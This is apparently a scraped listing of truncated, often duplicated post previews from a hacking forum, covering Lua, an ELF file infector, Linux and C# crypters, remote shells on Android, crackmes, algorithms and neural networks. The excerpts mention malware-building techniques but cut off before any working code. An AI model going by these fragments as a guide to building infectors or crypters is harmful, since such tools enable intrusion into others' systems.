GUI? With credit given, of course.", "Awesome tutorial man ^^ I had been thinking about learning Lua for a while. Also Ada, however I found out I don\u2019t have to write missile guiding software, or Nuclear Power Plant driver modules, so I let that one slide. Anyway I think this might be the perfect midway, between C and a scripting lang&hellip;", "This is a very good point. It makes me recall my first steps with Arduinos. For years I knew about the devices but I never tried. All those electronics looked way too advanced to me. It just looked out of scope. But one day I decided to try. Indeed it required a little bit of effort but very quickl&hellip;", "Great article! I honestly thought that Lua was used for scripting in video games. And at the end of the article you said [quote=\u201c0x00pf, post:1, topic:593\u201d] Do you have an idea for a hacking tool using an scripting language?.. Let us know! [/quote] And just to add on I believe I do\u2026 So how the t&hellip;", "No, we are not going to talk about space travelling, or interplanetary missions. No. We are going to talk about Lua. Lua is Portuguese for Moon and it is a very nice scripting language that is usually hidden behind the Python hype. Anyway, why are we talking about Lua?. Well, I have been planning t&hellip;", "No, we are not going to talk about space travelling, or interplanetary missions. No. We are going to talk about Lua. Lua is Portuguese for Moon and it is a very nice scripting language that is usually hidden behind the Python hype. Anyway, why are we talking about Lua?. Well, I have been planning t&hellip;", "This is a very good point. It makes me recall my first steps with Arduinos. For years I knew about the devices but I never tried. All those electronics looked way too advanced to me. It just looked out of scope. But one day I decided to try. Indeed it required a little bit of effort but very quickl&hellip;", "Since I used to be posting networking articles on Null Byte and I\u2019m planning to continue my series here, let me know which topics you want to cover so we can have a collab if you are interested so there won\u2019t be any repetition.", "At first glance it looks good!", "So far I have this: http://pastebin.com/DywNNiw2 Though there are some issues ^_^&#39; Think I there are some pointer issues.", "No, we are not going to talk about space travelling, or interplanetary missions. No. We are going to talk about Lua. Lua is Portuguese for Moon and it is a very nice scripting language that is usually hidden behind the Python hype. Anyway, why are we talking about Lua?. Well, I have been planning t&hellip;", "Don\u2019t get fooled by the title. The link below doesn\u2019t teach you how to code a complete OS. I thought it would be an interesting read for the low-level members of 0x00sec. Here you go: http://tutorialsbynick.com/writing-an-os-baby-steps/", "This is a very good point. It makes me recall my first steps with Arduinos. For years I knew about the devices but I never tried. All those electronics looked way too advanced to me. It just looked out of scope. But one day I decided to try. Indeed it required a little bit of effort but very quickl&hellip;", "No, we are not going to talk about space travelling, or interplanetary missions. No. We are going to talk about Lua. Lua is Portuguese for Moon and it is a very nice scripting language that is usually hidden behind the Python hype. Anyway, why are we talking about Lua?. Well, I have been planning t&hellip;", "Damn! I knew that Lua was used in wireshark, but integrating it into C? Never thought of it that way. Awesome post @0x00pf!", "Damn! I knew that Lua was used in wireshark, but integrating it into C? Never thought of it that way. Awesome post @0x00pf!", "No, we are not going to talk about space travelling, or interplanetary missions. No. We are going to talk about Lua. Lua is Portuguese for Moon and it is a very nice scripting language that is usually hidden behind the Python hype. Anyway, why are we talking about Lua?. Well, I have been planning t&hellip;", "No, we are not going to talk about space travelling, or interplanetary missions. No. We are going to talk about Lua. Lua is Portuguese for Moon and it is a very nice scripting language that is usually hidden behind the Python hype. Anyway, why are we talking about Lua?. Well, I have been planning t&hellip;", "Wise words m8te The other advantage I have found about using different sources is that you quickly identify the key points. Those central to most of the resources are the important stuff and you easily assimilate what is relevant and what not.", "I guess you\u2019re both right. It\u2019s a behaviour I encountered a lot up to this date and it\u2019s not related to Hacking only. For example: I study arabic and when the stuff got a lot tougher i saw so many people drop out just because it involved more work. I get the feeling that a lot of people seem to be&hellip;", "Wise words m8te The other advantage I have found about using different sources is that you quickly identify the key points. Those central to most of the resources are the important stuff and you easily assimilate what is relevant and what not.", "\u201cIf you never failed, you never tried anything new\u201d. That\u2019s one of the quotes that keep me going when I delve into something completely out of my comfort zone. If you don\u2019t expose yourself to new ideas you will never grow. Neither mentally or personally. I wouldn\u2019t recommend self researching as the&hellip;", "This is a very good point. It makes me recall my first steps with Arduinos. For years I knew about the devices but I never tried. All those electronics looked way too advanced to me. It just looked out of scope. But one day I decided to try. Indeed it required a little bit of effort but very quickl&hellip;", "\u201cIf you never failed, you never tried anything new\u201d. That\u2019s one of the quotes that keep me going when I delve into something completely out of my comfort zone. If you don\u2019t expose yourself to new ideas you will never grow. Neither mentally or personally. I wouldn\u2019t recommend self researching as the&hellip;", "This is exactly what I mean. Thanks for the input.", "This is exactly what I mean. Thanks for the input.", "This is a very good point. It makes me recall my first steps with Arduinos. For years I knew about the devices but I never tried. All those electronics looked way too advanced to me. It just looked out of scope. But one day I decided to try. Indeed it required a little bit of effort but very quickl&hellip;", "This is a very good point. It makes me recall my first steps with Arduinos. For years I knew about the devices but I never tried. All those electronics looked way too advanced to me. It just looked out of scope. But one day I decided to try. Indeed it required a little bit of effort but very quickl&hellip;", "This is a very good point. It makes me recall my first steps with Arduinos. For years I knew about the devices but I never tried. All those electronics looked way too advanced to me. It just looked out of scope. But one day I decided to try. Indeed it required a little bit of effort but very quickl&hellip;", "I\u2019ve noticed something over the years: you should never trust your doctor blindly. In fact, don\u2019t trust anyone merely because they are an \u201cexpert\u201d or a \u201cprofessional.\u201d There is this idea that certain things can only be understood with a degree. It\u2019s funny, the misconception that a degree defines &hellip;", "I tried to be generic. USB is serial and JTAG is also serial\u2026 As you said there is no room for a parallel port. I agree with @unh0lys0da. Starting with a router is probably way simpler. Otherwise those are some links that may interest you: A couple of DIY GSM phones to grasp the basics of that a&hellip;", "Serial pins on a smartphone would be very small and I doubt there are any. Reverse engineering is something smartphone manufracturers will try to prevent as much as possible. Nevertheless, one way or another they must\u2019ve used this or JTAG, or something else to put the stuff on the chips (I think) @&hellip;", "Serial pins on a smartphone would be very small and I doubt there are any. Reverse engineering is something smartphone manufracturers will try to prevent as much as possible. Nevertheless, one way or another they must\u2019ve used this or JTAG, or something else to put the stuff on the chips (I think) @&hellip;", "Yes I get it  About the modification, I\u2019ll try it right now, see if it makes a difference ^^ I\u2019ll also try to implement the 32 and 64 bit stuff.", "Sounds very interesting, but writing a how to on that topic, one that could be useful for you, may be very tricky. I\u2019m afraid that pre-smartphones were not as homogeneous as nowadays phones. Still today there are differences between the terminals from different manufacturers but before it was even m&hellip;", "Sounds very interesting, but writing a how to on that topic, one that could be useful for you, may be very tricky. I\u2019m afraid that pre-smartphones were not as homogeneous as nowadays phones. Still today there are differences between the terminals from different manufacturers but before it was even m&hellip;", "Nice post\u2026 It is funny that I was working in something similar for a different language.", "Sure. We are just changing bytes in a file. If you check the structure in the elf.h it is actuall 16bits. I think you are right with this. have you tried the modification?. I will take a look later but looks like you are right. Well, that code is not the best in the world. This injector alway&hellip;", "That is indeed possible. I just chose 64bits in the post to keep it simple, but indeed, a proper program should work with both architectures\u2026 I\u2019m looking forward to your version of the injector!!!", "That\u2019s one way, the thing is, I want to let the program check what architecture it is, by typecasting data as an array first and see what arr[4]&#39;s value is (e_ident[EI_CLASS]). So that it would work on both 32 bit and 64 bit.", "This is great. We could even combine this with something like @0x00pf\u2019s ELF Injector to make a simple Python-based GUI.", "Nice post\u2026 It is funny that I was working in something similar for a different language.", "Sometimes, scripting languages aren\u2019t fast enough to do actions to my liking, but I still need to use that language. Thankfully, Python has a way to make modules in the C language. These modules can not only speed up a program, but also lets one use C functions. This is more of an intermediate topic&hellip;", "I don\u2019t know about others here, but I think it would be awesome to see some hardware hacking how-tos! I would certainly be interested in the basics! I have a friend that would probably also be interested in them. I\u2019ve recently been wondering how exactly you would go about hacking a cell (not smart) &hellip;", "Sounds very interesting, but writing a how to on that topic, one that could be useful for you, may be very tricky. I\u2019m afraid that pre-smartphones were not as homogeneous as nowadays phones. Still today there are differences between the terminals from different manufacturers but before it was even m&hellip;", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "Because it would determin on runtime, it\u2019s not about the injector, it\u2019s about the target file. @0x00pf Would it be possible to infect 64 bit files, if I\u2019d compile this injector as a 32 bit ELF binary? I maybe found some bugs:   elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr     + (unsigne&hellip;", "That\u2019s one way, the thing is, I want to let the program check what architecture it is, by typecasting data as an array first and see what arr[4]&#39;s value is (e_ident[EI_CLASS]). So that it would work on both 32 bit and 64 bit.", "This is great. We could even combine this with something like @0x00pf\u2019s ELF Injector to make a simple Python-based GUI.", "Well I thought hardware-hacking of course, since they don\u2019t connect to WiFi or Bluetooth, or mobile Data. If there\u2019s a way to access through the USB connection, that would be cool. I wouldn\u2019t be surprised if I had to take it apart though and connect something to the inner workings. If I got an adapt&hellip;", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "What do you have in mind when you talk about hacking a cell phone?", "Then you need to use the 32bits structures\u2026 there are some differences between both\u2026 basically change 64 to 32 in all the data structures (e.g. Elf64_Ehdr -&gt; Elf32_Ehdr).", "I\u2019ll also work on 32bit support, might this be a cause for the issue?", "Ok so I figured out what every line of code does and I\u2019m stunned. This is amazing man so many props. mmaping, typecasting as Elf header struct, I never thought something like that would be possible. Thanks for keeping the fun in my pursuit in gaining knowledge  tbh I had a small crisis of faith &hellip;", "Yes, you will get the same, if you open the file normally and just read the first bytes in a Elf64_Ehdr variable. I\u2019m looking forward to your findings. It looks to be related to PIE code\u2026 but it may just be something stupid\u2026", "Hey everyone! This article is a followup to my last one about the Bellman Ford Algorithm. /*    Bellman-Ford with an Adjacency List*/#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;limits&gt;#include &lt;utility&gt; typedef std::vector&lt; std::vector&lt; std::pair&lt;int,int&gt; &gt; &gt; adj_list&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "Hello 0x00sec people! It\u2019s @oaktree once again coming at you with another tutorial. This time, it\u2019s about the Bellman-Ford Algorithm. This algorithm is very similar to Dijkstra\u2019s Algorithm from last time, yet it diverges in that it is designed to handle negative edge weights, which are \u201cnegative di&hellip;", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "Perl#!/usr/bin/perl&lt;&gt;;while (($n, $k) = split (/\\s+/, &lt;&gt;))  {    @d = split (/\\s+/, &lt;&gt;);    die &quot;Malformed line\\n&quot; if ($#d != --$n);    for ($i = 0, $res =0; $i &lt;= $#d &amp;&amp; $res &lt; $k; $i++)      {$res++ if ($d[$i] &lt; 1);      }    print (($res &gt;= $k) ? &quot;NO\\n&quot; : &quot;YES\\n&quot; );  }I haven\u2019t u&hellip;", "Perl#!/usr/bin/perl&lt;&gt;;while (($n, $k) = split (/\\s+/, &lt;&gt;))  {    @d = split (/\\s+/, &lt;&gt;);    die &quot;Malformed line\\n&quot; if ($#d != --$n);    for ($i = 0, $res =0; $i &lt;= $#d &amp;&amp; $res &lt; $k; $i++)      {$res++ if ($d[$i] &lt; 1);      }    print (($res &gt;= $k) ? &quot;NO\\n&quot; : &quot;YES\\n&quot; );  }I haven\u2019t u&hellip;", "Gotta love your weather forecast when new users join the IRC channel.", "Hahahaha, me too. I think it\u2019s good to recognise any potential flaw; rather than ignore them.", "My favorite thing is learning how to break things, and how to avoid making breakable things. I also like making people uncomfortable when I list all the ways they can be hacked.", "The Infomation Security Community is an awesome community, and ones like ours really rock. The one factor in my opinion that really drives the community is the people. Tinkering and Hacking, taking things apart to see how they work, is in our nature, and a community that operates and thinks like tha&hellip;", "A Discrete Mathematics professor has a class of  N students. Frustrated with their lack of discipline, he decides to cancel class if fewer than K students are present when class starts. Given the arrival time of each student, determine if the class is canceled. InputFirst take in T, the number o&hellip;", "Team name: NeedCashForPizza Team Members as of now: @pry0cc@oaktree", "0x00sec is proud to announce the new and upcoming CTF sponsored and hosted by s^3! DetailsThe CTF will be beginning within the next few weeks, however the time and date is not yet final. This post will be updated when new infomation becomes final. The details to the CTF server will be PM\u2019d to you &hellip;", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "COFF is indeed a reference for PE\u2026 but ELF is not based on COFF. Anyway, they share a lot of concepts. Also thanks for your words ;), that\u2019s appreciated I have found myself this link very useful. http://phrack.org/issues/58/5.html It is 15 years old, but the ELF format haven\u2019t change much sinc&hellip;", "@airth, the best are the specification http://refspecs.linuxbase.org/elf/elf.pdf and the includes (/usr/include/elf.h). There are many pages describing the format but, once you now what is it about, the specification is the main document you need.", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "COFF is indeed a reference for PE\u2026 but ELF is not based on COFF. Anyway, they share a lot of concepts. Also thanks for your words ;), that\u2019s appreciated I have found myself this link very useful. http://phrack.org/issues/58/5.html It is 15 years old, but the ELF format haven\u2019t change much sinc&hellip;", "COFF is indeed a reference for PE\u2026 but ELF is not based on COFF. Anyway, they share a lot of concepts. Also thanks for your words ;), that\u2019s appreciated I have found myself this link very useful. http://phrack.org/issues/58/5.html It is 15 years old, but the ELF format haven\u2019t change much sinc&hellip;", "@airth, the best are the specification http://refspecs.linuxbase.org/elf/elf.pdf and the includes (/usr/include/elf.h). There are many pages describing the format but, once you now what is it about, the specification is the main document you need.", "I know. That part was a bit messy\u2026 and I re-wrote it a couple of times. I probably should try again in a week or two", "I have looked at a bunch of links. @0x00pf just seems to know more than the links I read.", "Do you recommend any ELF, PE structure documentation?", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "Thanks @airth for the positive feedback. It is pretty much appreciated coming from you", "Thanks @airth for the positive feedback. It is pretty much appreciated coming from you", "A lot to take in but educational at the same time. Good stuff pico!", "Nice hands-on intro. I would suggest to remove the mention to XOR at the beginning. XOR is actually one of the function you cannot solve with a perceptron \u2026", "Ugh, yes I just realized . Thanks man! Yeah I actually planned to use XOR as one to start into multi layered networks lol. I don\u2019t know why I put it there.", "There we go, fixed lol.", "Ugh, yes I just realized . Thanks man! Yeah I actually planned to use XOR as one to start into multi layered networks lol. I don\u2019t know why I put it there.", "Nice hands-on intro. I would suggest to remove the mention to XOR at the beginning. XOR is actually one of the function you cannot solve with a perceptron \u2026", "Nice hands-on intro. I would suggest to remove the mention to XOR at the beginning. XOR is actually one of the function you cannot solve with a perceptron \u2026", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "Hello! I apologize for not posting part 1 sooner. I know I paraded on about free time in the comment section, but unfortunately some personal events prevented me from posting earlier. Also, this is gonna be approached differently than I said it was in part 0. I feel this would be more productive t&hellip;", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "As @dtm has explained us how to write a crypter for Windows, and @TheDoctor has done the same for C#, I\u2019m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the o&hellip;", "Thanks @oaktree. I\u2019m not sure about what did you mean. Maybe my wording was a bit loose. It is indeed preprocessor stuff. I use define, but formally it is a preprocessor macro. The fact is that you can either define your macro in the source code using #define _ANDROID or you can achieve exactly the&hellip;", "If you have been following this series, you may remember that I started Part I with an use case involving remote access to an Android Phone. This part will cover how to get a remote shell access to your phone and other devices. Actually, deploying our remote shells in a device is nothing special, b&hellip;", "Indeed you can follow a bottom-up or a top-down approach. That is up to you. My understanding is that @TheDoctor is looking into GNU/Linux to keep working on his crackmes as consequence of the outcome of the poll he posted some days ago. In that context, my guess is that he wants something up and r&hellip;", "Indeed you can follow a bottom-up or a top-down approach. That is up to you. My understanding is that @TheDoctor is looking into GNU/Linux to keep working on his crackmes as consequence of the outcome of the poll he posted some days ago. In that context, my guess is that he wants something up and r&hellip;", "Fully concur with @oaktree.", "Fully concur with @oaktree.", "Hey Mates, as I said before, I want to install a new Linux distro. The only problem is that I don\u2019t know which one I should chose . Maybe some of you can recommend me one. I search one that is a demanding but not too hard for a Linux starter. Thanks in advance! |-TheDoctor-|", "Fully concur with @oaktree.", "For an absolute n00b? Ubuntu, Ubuntu MATE, Linux Mint Cinnamon, or Linux Mint MATE.", "If you have been following this series, you may remember that I started Part I with an use case involving remote access to an Android Phone. This part will cover how to get a remote shell access to your phone and other devices. Actually, deploying our remote shells in a device is nothing special, b&hellip;", "Hey Mates, I think everyone of you has had the dream of building his own crypter; I know I have (for about a year, now). Everyone has heard of this \u201cblack magic\u201d (as @dtm mentioned in his post). But, maybe some of you, like me, were unsuccessful in programming one. A crypter in C# is not as usefu&hellip;", "Hey Mates, I think everyone of you has had the dream of building his own crypter; I know I have (for about a year, now). Everyone has heard of this \u201cblack magic\u201d (as @dtm mentioned in his post). But, maybe some of you, like me, were unsuccessful in programming one. A crypter in C# is not as usefu&hellip;", "Thanks to @pry0cc for his very fast solving of the problem! Seems it was a language pack error or something\u2026 Ask @pry0cc for a better description ;). However, when I clicked on the topic I was sure that @0x00pf will get it because he\u2019s doing great stuff here, also in the RE section. Was surprised th&hellip;", "If you have been following this series, you may remember that I started Part I with an use case involving remote access to an Android Phone. This part will cover how to get a remote shell access to your phone and other devices. Actually, deploying our remote shells in a device is nothing special, b&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "Thanks to @pry0cc for his very fast solving of the problem! Seems it was a language pack error or something\u2026 Ask @pry0cc for a better description ;). However, when I clicked on the topic I was sure that @0x00pf will get it because he\u2019s doing great stuff here, also in the RE section. Was surprised th&hellip;", "If you have been following this series, you may remember that I started Part I with an use case involving remote access to an Android Phone. This part will cover how to get a remote shell access to your phone and other devices. Actually, deploying our remote shells in a device is nothing special, b&hellip;", "Congrats @TheDoctor! Well done!", "Congrats @TheDoctor! Well done!", "Hey everyone! 1337 of the w33k goes to @TheDoctor this week, for his CrackMes. Keep it up, @TheDoctor. On behalf of all the staff, you\u2019re doin\u2019 great. Wanna be the next 1337 of the w33k? The recognition is given to a member who has made many high-quality contributions. What can you bring to 0x00s&hellip;", "If you have been following this series, you may remember that I started Part I with an use case involving remote access to an Android Phone. This part will cover how to get a remote shell access to your phone and other devices. Actually, deploying our remote shells in a device is nothing special, b&hellip;", "Thanks @oaktree. I\u2019m not sure about what did you mean. Maybe my wording was a bit loose. It is indeed preprocessor stuff. I use define, but formally it is a preprocessor macro. The fact is that you can either define your macro in the source code using #define _ANDROID or you can achieve exactly the&hellip;", "Wouldn\u2019t this be just standard preprocessor stuff, rather than \u201ca define?\u201d Anyway, this tutorial is crazy! I\u2019d give you 2674 of the w33k, lol! (1337 * 2)", "Thanks @oaktree. I\u2019m not sure about what did you mean. Maybe my wording was a bit loose. It is indeed preprocessor stuff. I use define, but formally it is a preprocessor macro. The fact is that you can either define your macro in the source code using #define _ANDROID or you can achieve exactly the&hellip;", "Thanks @oaktree. I\u2019m not sure about what did you mean. Maybe my wording was a bit loose. It is indeed preprocessor stuff. I use define, but formally it is a preprocessor macro. The fact is that you can either define your macro in the source code using #define _ANDROID or you can achieve exactly the&hellip;", "If you have been following this series, you may remember that I started Part I with an use case involving remote access to an Android Phone. This part will cover how to get a remote shell access to your phone and other devices. Actually, deploying our remote shells in a device is nothing special, b&hellip;", "Wouldn\u2019t this be just standard preprocessor stuff, rather than \u201ca define?\u201d Anyway, this tutorial is crazy! I\u2019d give you 2674 of the w33k, lol! (1337 * 2)", "If you have been following this series, you may remember that I started Part I with an use case involving remote access to an Android Phone. This part will cover how to get a remote shell access to your phone and other devices. Actually, deploying our remote shells in a device is nothing special, b&hellip;", "Once again @dtm successfully reversed the relevant function in the crackme and found the hidden password. Congrats!. To conclude with this series of post regarding this crackme, I will show you the source code, explain why it is a bit messy and give you some basics on how to reverse engineer functi&hellip;", "If you have been following this series, you may remember that I started Part I with an use case involving remote access to an Android Phone. This part will cover how to get a remote shell access to your phone and other devices. Actually, deploying our remote shells in a device is nothing special, b&hellip;", "If you have been following this series, you may remember that I started Part I with an use case involving remote access to an Android Phone. This part will cover how to get a remote shell access to your phone and other devices. Actually, deploying our remote shells in a device is nothing special, b&hellip;", "The idea is that when you solve this (you break the password and you can run the program), you get a password for the next level. I thought about generating the password dynamically so you cannot find it with a simple strings. You actually have to crack the program to get the password for the next l&hellip;", "I was trying my best not to read your solution. Now that I can see the pass variable, is the repeated bytes a result from the side project?", "yes, the whole thing\u2026 including original bugs and unused code", "Ohh, I actually just realized that you put up your entire source code. Heh\u2026", "I think I mentioned, this is part of a side project. I should have removed from the crackme\u2026 as it is not used at all. The gen_pass just reverses a string. The idea was to generate a challenger where the password/token you have to get is not the program password, but something else the program gene&hellip;", "Here\u2019s my reversed version of your code. I had to assume the XOR modulo was 8 from the information on Stack Overflow but I referenced from your solution as well. I still need to figure out what\u2019s happening with all the modulus optimizations from compilers\u2026 ipass[] = {0x23, 0x89, 0xF2, 0xC2, 0x6D, 0&hellip;", "Once again @dtm successfully reversed the relevant function in the crackme and found the hidden password. Congrats!. To conclude with this series of post regarding this crackme, I will show you the source code, explain why it is a bit messy and give you some basics on how to reverse engineer functi&hellip;", "Hey everyone! In this tutorial, I\u2019m going to teach how you can conceal messages in a text file using SNOW (Steganographic Nature Of Whitespace). I discovered this program today and I thought it was a good and simple share. But first, what is Steganography? According to Wikipedia, \u201cSteganography is &hellip;", "Old tricks are the best tricks, eh chaps!", "I\u2019m finished with this. I\u2019m not sure that correctly understand how works heartbeat, so maybe my hack is not according to challenge rules  Please, let me know if there is any mistake in workflow with server. My steps to create solution: [spoiler]How I say, I\u2019m not sure that I\u2019m correctly use the se&hellip;", "Once again @dtm successfully reversed the relevant function in the crackme and found the hidden password. Congrats!. To conclude with this series of post regarding this crackme, I will show you the source code, explain why it is a bit messy and give you some basics on how to reverse engineer functi&hellip;", "I see what you mean. Indeed it should be 0. That was a mistake. I haven\u2019t catch it because, for some reason it works\u2026 Reading for stdout actually works as reading from stdin\u2026 I had just made a quick test and I can also write to stdin\u2026 I\u2019ll wait then for your writting and I will post mine own after&hellip;", "Still doesn\u2019t address why it\u2019s 1 instead of 0? Anyway, I\u2019ll be writing up my reversed version of your program in a bit. See how accurate I am.", "Lucky you! Guess we will see some cool AI stuff coming soon!", "My fault. You are completely right. Now you already know what is file descriptor 1", "Yeah, I thought it did that to the terminal. That\u2019s strange. When I looked it up, STDIN is 0. GNU - Descriptors and Streams", "Congrats! @dtm you did it again! I will post the original code and some hints later, but answering your questions. The my_getpass function disables the console echo, so the password is not shown while you typeFile descriptor 1 is the Standard InputGlad to hear you had fun!", "Yeah, I thought it did that to the terminal. That\u2019s strange. When I looked it up, STDIN is 0. GNU - Descriptors and Streams", "Congrats! @dtm you did it again! I will post the original code and some hints later, but answering your questions. The my_getpass function disables the console echo, so the password is not shown while you typeFile descriptor 1 is the Standard InputGlad to hear you had fun!", "Okay, I\u2019ve been reversing your program and I think I\u2019ve got it, though there are some things I do not understand. Your my_getpass function is pretty unclear to me since I have no idea what tcgetattr and tcsetattr do (I think it has to do with modifying the input mechanism from the user), all I could&hellip;", "Very cool stuff! I share one tutorial which seems to be updated here: http://vyznev.net/corewar/guide.html", "Learning assembly takes a while, and it is a bit hard to jump straight into a modern processor and start coding\u2026 So, if you do not have any experience with the bare metal, it is good to start with a pretty simple assembly. And the simplest assembly I can recall is called RedCode Despite of being &hellip;", "That\u2019s good. In a sense SVMs have substitute MLPs in many fields\u2026 Do not spend much time with the Hopfield networks. They are nice because of its simplicity (structural and training-wise), so they make a nice case for an introduction to the topic. Their main problem is the limited capacity that pre&hellip;", "Love it! As you asked for comments. Regarding the training, I would say you are talking about supervised learning. This is indeed how perceptrons are trained, but there are other networks that can be trained un-sepervised (Kohonen Networks for instance).It might be worth mention that you may hav&hellip;", "Anything that does not require a Windows Box would be fine!", "Lucky you! Guess we will see some cool AI stuff coming soon!", "Man I just got into summer break so time is pretty plentiful luckily", "Man I just got into summer break so time is pretty plentiful luckily", "Yes. Now everything is using convolutional networks Take a look to caffe project (http://caffe.berkeleyvision.org/). Google released tensorflow recently (https://www.tensorflow.org/)\u2026 there is quite some material to work with\u2026 if you have the time!", "Yes. Now everything is using convolutional networks Take a look to caffe project (http://caffe.berkeleyvision.org/). Google released tensorflow recently (https://www.tensorflow.org/)\u2026 there is quite some material to work with\u2026 if you have the time!", "Ah I see. Yeah like the one neural network doing all the image manipulation stuff. I think its Googles.", "That\u2019s good. In a sense SVMs have substitute MLPs in many fields\u2026 Do not spend much time with the Hopfield networks. They are nice because of its simplicity (structural and training-wise), so they make a nice case for an introduction to the topic. Their main problem is the limited capacity that pre&hellip;", "Learning assembly takes a while, and it is a bit hard to jump straight into a modern processor and start coding\u2026 So, if you do not have any experience with the bare metal, it is good to start with a pretty simple assembly. And the simplest assembly I can recall is called RedCode Despite of being &hellip;", "Fwiw, I also heard TIS-100 is also a pretty solid game to pick up on assembly. Currently 6 bucks on steam iirc.", "Ooooh this looks fun. Thanks for sharing!", "Very interesting. Looks pretty similar to RedCode (the assembly I mean), so I would say that, from a learning point of view, it would be pretty similar. I like more the concept of having to programs fighting for resources in a computer that solving puzzle approach\u2026 But that is a completely person m&hellip;", "Thanks @0x00pf ! and yes, I will look into SVMs! I never heard of hopfield networks, but I will check them out also!", "And yeah, I guess deep learning is a goal of mine, but the Artificial Intelligence section would benefit from any machine  learning algorithms I\u2019d say :). Including the Hopfield networks. I\u2019ll definitely have to familiarize myself with them.", "That\u2019s good. In a sense SVMs have substitute MLPs in many fields\u2026 Do not spend much time with the Hopfield networks. They are nice because of its simplicity (structural and training-wise), so they make a nice case for an introduction to the topic. Their main problem is the limited capacity that pre&hellip;", "Learning assembly takes a while, and it is a bit hard to jump straight into a modern processor and start coding\u2026 So, if you do not have any experience with the bare metal, it is good to start with a pretty simple assembly. And the simplest assembly I can recall is called RedCode Despite of being &hellip;", "Learning assembly takes a while, and it is a bit hard to jump straight into a modern processor and start coding\u2026 So, if you do not have any experience with the bare metal, it is good to start with a pretty simple assembly. And the simplest assembly I can recall is called RedCode Despite of being &hellip;", "Learning assembly takes a while, and it is a bit hard to jump straight into a modern processor and start coding\u2026 So, if you do not have any experience with the bare metal, it is good to start with a pretty simple assembly. And the simplest assembly I can recall is called RedCode Despite of being &hellip;", "Thanks @0x00pf ! and yes, I will look into SVMs! I never heard of hopfield networks, but I will check them out also!", "And yeah, I guess deep learning is a goal of mine, but the Artificial Intelligence section would benefit from any machine  learning algorithms I\u2019d say :). Including the Hopfield networks. I\u2019ll definitely have to familiarize myself with them.", "Thanks @0x00pf ! and yes, I will look into SVMs! I never heard of hopfield networks, but I will check them out also!", "Love it! As you asked for comments. Regarding the training, I would say you are talking about supervised learning. This is indeed how perceptrons are trained, but there are other networks that can be trained un-sepervised (Kohonen Networks for instance).It might be worth mention that you may hav&hellip;", "Learning assembly takes a while, and it is a bit hard to jump straight into a modern processor and start coding\u2026 So, if you do not have any experience with the bare metal, it is good to start with a pretty simple assembly. And the simplest assembly I can recall is called RedCode Despite of being &hellip;", "Pretty cool idea! I thought of community projects in other fields as well because we are currently a group of nice guys.", "@pry0cc you\u2019d think it would be interesting to kick off a community project involving HW?.. Maybe start with something simpler that this keylogger and go further step by step", "Pretty cool idea! I thought of community projects in other fields as well because we are currently a group of nice guys.", "@pry0cc you\u2019d think it would be interesting to kick off a community project involving HW?.. Maybe start with something simpler that this keylogger and go further step by step", "I just wanted to start a little poll on what OS you\u2019re using in generell. Maybe it\u2019s interesting to know for someone which OS should be supported the most in articles . [Poll] WindowsLinuxDual-Boot Win/LinuxMacOther [/Poll] Currently I am using Windows but this will change in the next weeks&hellip;", "Love it! As you asked for comments. Regarding the training, I would say you are talking about supervised learning. This is indeed how perceptrons are trained, but there are other networks that can be trained un-sepervised (Kohonen Networks for instance).It might be worth mention that you may hav&hellip;", "Nice. I think we should move this to a new category, though: How-To -&gt; Artificial Intelligence.", "Hello! Random-man reporting. So this is gonna be a quick write up on some basic neural network stuff, and I\u2019ll probably divide it in 2 parts. First off, let me say that I\u2019m not a professional computer scientist or mathematician. I want to head down that route when I get to the point in life, but for&hellip;", "I think is [poll]- Windows- Linux- Both[/poll]", "I think is [poll]- Windows- Linux- Both[/poll]", "Yep, thought the same but didn\u2019t found the poll function\u2026 You know how it works?", 